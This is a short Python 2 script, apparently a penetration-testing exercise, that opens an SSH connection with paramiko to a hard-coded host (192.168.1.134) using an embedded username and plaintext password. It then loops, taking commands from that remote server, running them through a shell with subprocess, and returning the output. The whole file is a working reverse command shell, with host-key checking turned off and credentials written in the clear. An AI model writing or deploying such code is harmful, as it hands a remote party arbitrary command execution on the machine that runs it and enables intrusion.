#!/usr/bin/env python
#-*- coding:utf-8 -*-

import threading
import paramiko
import subprocess

def ssh_command(command, ip, user, passwd, port=22):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/justin/.ssh/known_hosts')    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd, port=port)
    ssh_session = client.get_transport().open_session()    
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)#read banner
        while True:
            command = ssh_session.recv(1024) #get the command from the SSH server            
            try:
                cmd_out = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_out)
            except Exception as e:
                ssh_session.send(str(e))                
        client.close()
    return

ssh_command('ClientConnected', '192.168.1.134', 'cwx341659', 'jidaozhilong12!@')